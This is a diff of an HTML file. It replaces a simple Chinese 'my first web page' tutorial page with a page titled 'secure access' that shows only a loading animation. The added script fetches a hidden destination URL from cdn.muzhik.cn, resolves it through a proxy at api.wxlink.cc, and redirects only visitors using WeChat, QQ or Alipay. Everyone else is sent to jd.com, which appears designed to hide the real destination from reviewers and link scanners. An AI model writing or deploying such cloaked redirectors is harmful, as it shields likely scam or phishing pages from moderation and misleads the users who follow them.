@@ -1,165 +1,145 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>我的第一个网页</title>
-    <link href="https://fonts.googleapis.com/css2?family=Ma+Shan+Zheng&family=Noto+Sans+SC:wght@400;700&display=swap" rel="stylesheet">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0,user-scalable=no,minimal-ui" />
+    <title>安全访问</title>
+    <link rel="shortcut icon" href="https://img.ebai.fun/images/202505/89c46c9c7d134eef.png" type="image/x-icon" />
     <style>
-        * {
-            margin: 0;
+        html,
+        body,
+        #app,
+        iframe {
             padding: 0;
-            box-sizing: border-box;
+            margin: 0;
+            width: 100%;
+            height: 100%;
+            border: 0;
         }
-        
-        body {
-            font-family: 'Noto Sans SC', sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            color: #333;
-            line-height: 1.6;
-            min-height: 100vh;
+
+        #app {
             display: flex;
-            flex-direction: column;
-            justify-content: center;
             align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 800px;
-            background: rgba(255, 255, 255, 0.92);
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            padding: 40px;
-            text-align: center;
-            margin: 20px;
-            animation: fadeIn 1s ease-out;
-        }
-        
-        h1 {
-            font-size: 3.5rem;
-            margin-bottom: 20px;
-            color: #2c3e50;
-            font-family: 'Ma Shan Zheng', cursive;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        
-        .subtitle {
-            font-size: 1.8rem;
-            color: #3498db;
-            margin-bottom: 40px;
-            font-weight: 700;
-        }
-        
-        p {
-            font-size: 1.2rem;
-            margin: 15px 0;
-            text-align: left;
-        }
-        
-        .highlight {
-            background: linear-gradient(120deg, #a1c4fd 0%, #c2e9fb 100%);
-            padding: 3px 8px;
-            border-radius: 5px;
-            font-weight: bold;
-        }
-        
-        .features {
-            display: flex;
-            flex-wrap: wrap;
             justify-content: center;
-            gap: 20px;
-            margin: 40px 0;
-        }
-        
-        .feature-box {
-            background: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
             padding: 20px;
-            border-radius: 12px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            width: 200px;
-            transition: transform 0.3s ease;
         }
-        
-        .feature-box:hover {
-            transform: translateY(-10px);
+
+        .mouth {
+            fill: none;
+            stroke: #00b51d;
+            stroke-width: 5;
+            stroke-linecap: round;
+            stroke-dasharray: 44, 44;
+            transform-origin: center;
+            animation: mounthAni 2.3s ease-out infinite;
         }
-        
-        .feature-box i {
-            font-size: 2.5rem;
-            color: #3498db;
-            margin-bottom: 15px;
+
+        .eye {
+            fill: none;
+            stroke: #00b51d;
+            stroke-width: 5;
+            stroke-linecap: round;
+            stroke-dasharray: 0, 66;
+            transform-origin: center;
+            transform: rotate(-45deg);
+            animation: eyeAni 2.3s ease-in-out infinite;
         }
-        
-        .feature-title {
-            font-weight: bold;
-            margin-bottom: 10px;
-            color: #2c3e50;
-        }
-        
-        .footer {
-            margin-top: 40px;
-            color: #7f8c8d;
-            font-size: 1rem;
-        }
-        
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
+
+        @keyframes mounthAni {
+            40% {
+                stroke-dasharray: 44, 22;
             }
-            to {
-                opacity: 1;
-                transform: translateY(0);
+
+            80%,
+            100% {
+                stroke-dasharray: 44, 44;
+                transform: rotate(720deg);
             }
         }
-        
-        @media (max-width: 600px) {
-            h1 {
-                font-size: 2.5rem;
+
+        @keyframes eyeAni {
+            40% {
+                stroke-dasharray: 0, 77;
             }
-            
-            .subtitle {
-                font-size: 1.4rem;
-            }
-            
-            .container {
-                padding: 25px;
+
+            80%,
+            100% {
+                transform: rotate(675deg);
+                stroke-dasharray: 0, 66;
             }
         }
     </style>
 </head>
+
 <body>
-    <div class="container">
-        <h1>你好，世界！</h1>
-        <div class="subtitle">我的第一个HTML网页</div>
-        
-        <p>这是一个最简单的<span class="highlight">HTML5网页</span>，但添加了一些现代CSS样式使其更加美观。</p>
-        
-        <p>这个页面包含了HTML的基本结构元素：</p>
-        
-        <div class="features">
-            <div class="feature-box">
-                <div class="feature-title">HTML结构</div>
-                <div>DOCTYPE声明、html、head、body标签</div>
-            </div>
-            
-            <div class="feature-box">
-                <div class="feature-title">CSS样式</div>
-                <div>内部样式表美化页面</div>
-            </div>
-            
-            <div class="feature-box">
-                <div class="feature-title">响应式设计</div>
-                <div>适配各种设备屏幕</div>
-            </div>
-        </div>
-        
-        <p>使用现代CSS特性如<span class="highlight">Flexbox布局</span>、<span class="highlight">渐变背景</span>、<span class="highlight">动画效果</span>和<span class="highlight">阴影</span>，可以使简单的网页变得生动有趣。</p>
-        
-        <div class="footer">
-            <p>© 2023 最简单的HTML网页 | 使用纯HTML和CSS构建</p>
-        </div>
+    <div id="app">
+        <svg width="100" height="100">
+            <circle class="mouth" cx="50" cy="50" r="14"></circle>
+            <circle class="eye" cx="50" cy="50" r="14"></circle>
+        </svg>
     </div>
+    <script>
+        const app = document.querySelector('#app');
+        const API = `https://cdn.muzhik.cn/`;
+        const isWeChat = /MicroMessenger/i.test(navigator.userAgent);
+        const isQQ = /QQ/i.test(navigator.userAgent);
+        const isAlipay = /Alipay/i.test(navigator.userAgent);
+
+        function showMessageAndWait(message, time = 5000) {
+            app.innerText = message;
+            return new Promise(resolve => setTimeout(resolve, time));
+        }
+
+        // 获取URL查询参数
+        function getQuery(key) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.getAll(key).join('') || '';
+        }
+
+        async function main() {
+            try {
+                const dataParam = getQuery('data');
+                const initialResponse = await fetch(`${API}rpa.php?data=${dataParam}`);
+                const initialData = await initialResponse.json();
+                
+                if (!initialData.data) {
+                    throw new Error('无效的响应格式');
+                }
+                
+                const firstUrl = initialData.data;
+                // await showMessageAndWait(`获取的URL: ${firstUrl}`);
+                
+                const encodedUrl = encodeURIComponent(firstUrl);
+                const proxyUrl = `http://api.wxlink.cc:8686/redirect_proxy.php?url=${encodedUrl}`;
+                const finalResponse = await fetch(proxyUrl);
+                const finalData = await finalResponse.json();
+                
+                // 确保返回的数据结构正确
+                if (!finalData.data) {
+                    throw new Error('无效的响应格式');
+                }
+                
+                const targetUrl = finalData.data;
+                // await showMessageAndWait(`获取的最终URL: ${targetUrl}`);
+                
+                // 根据环境跳转
+                if (isWeChat || isQQ || isAlipay) {
+                    top.location.href = targetUrl;
+                } else {
+                    top.location.href = "https://jd.com";
+                }
+            } catch (error) {
+                console.error('加载失败:', error);
+                app.innerText = '加载失败, 请刷新重试或联系客服';
+            }
+        }
+
+        main();
+    </script>
 </body>
+
 </html>
